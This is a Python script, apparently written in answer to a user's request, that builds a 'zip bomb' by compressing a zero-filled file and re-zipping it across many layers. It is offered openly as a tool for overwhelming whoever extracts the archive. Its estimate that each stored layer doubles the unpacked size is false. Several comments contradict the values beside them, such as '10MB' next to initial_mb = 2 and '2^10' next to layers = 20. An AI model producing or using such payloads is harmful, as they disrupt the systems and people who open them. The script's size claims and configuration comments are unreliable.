import os
import zipfile

def create_zip_bomb(initial_file_size_mb, num_layers, output_filename="dangerous_bomb.zip"):
    """
    Creates a zip bomb by recursively zipping a highly compressible file.

    Args:
        initial_file_size_mb (int): The size of the initial dummy file in MB.
        num_layers (int): The number of recursive zip layers.
        output_filename (str): The name of the final zip bomb file.
    """
    if os.path.exists(output_filename):
        os.remove(output_filename)

    dummy_filename = "temp_dummy_file.txt"
    current_zip_filename = f"temp_layer0.zip" # This will be our initial compressible file

    # 1. Create the initial large, compressible dummy file
    print(f"Creating initial dummy file: {dummy_filename} ({initial_file_size_mb} MB)...")
    with open(dummy_filename, 'wb') as f:
        f.seek((initial_file_size_mb * 1024 * 1024) - 1)
        f.write(b'\0')
    print(f"Initial dummy file created.")

    # 2. Compress the dummy file into the first layer zip (temp_layer0.zip for naming consistency)
    with zipfile.ZipFile(current_zip_filename, 'w', zipfile.ZIP_DEFLATED) as zf:
        zf.write(dummy_filename, os.path.basename(dummy_filename))
    os.remove(dummy_filename)
    print(f"Layer 0 (initial compression) created: {current_zip_filename}")

    # 3. Recursively add the previous zip file into a new zip file for specified layers
    for i in range(num_layers):
        next_zip_filename = f"temp_layer{i+1}.zip"
        with zipfile.ZipFile(next_zip_filename, 'w', zipfile.ZIP_STORED) as zf: # Use ZIP_STORED for efficiency
            zf.write(current_zip_filename, os.path.basename(current_zip_filename))
        os.remove(current_zip_filename)
        current_zip_filename = next_zip_filename
        print(f"Layer {i+1} created: {current_zip_filename}")

    # 4. Rename the final zip bomb
    os.rename(current_zip_filename, output_filename)
    final_compressed_size_kb = os.path.getsize(output_filename) / 1024
    expanded_size_gb = (initial_file_size_mb * (2**num_layers)) / 1024 # Rough estimate
    print(f"\nZip Bomb '{output_filename}' created!")
    print(f"Compressed size: {final_compressed_size_kb:.2f} KB")
    print(f"Estimated uncompressed size: ~{expanded_size_gb:.2f} GB (assuming each layer roughly doubles effective size)")

if __name__ == "__main__":
    # --- Configuration for your zip bomb ---
    # Adjust these values to control the final uncompressed size

    # Option 1: Start with a smaller file, more layers
    # This might result in a very small compressed file.
    initial_mb = 1 # Start with a 1MB zero file
    layers = 10    # Go for 10 recursive layers (2^10 = 1024x expansion)
                   # 1MB * 1024 = 1GB

    # Option 2: Larger initial file, fewer layers (if Option 1 is too slow)
    # initial_mb = 10 # Start with a 10MB zero file
    # layers = 7    # 2^7 = 128x expansion. 10MB * 128 = 1.28GB

    # Option 3: Aim for 5-10GB uncompressed
    initial_mb = 2 # 10MB initial file
    layers = 20     # 2^10 = 1024x. 10MB * 1024 = 10240 MB = 10GB
    # (Be cautious with this, 10GB is a significant amount to expand!)

    # Choose one of the above configurations by uncommenting it.
    # The last one (initial_mb=10, layers=10) is what you asked for (10GB)

    create_zip_bomb(initial_file_size_mb=initial_mb, num_layers=layers)
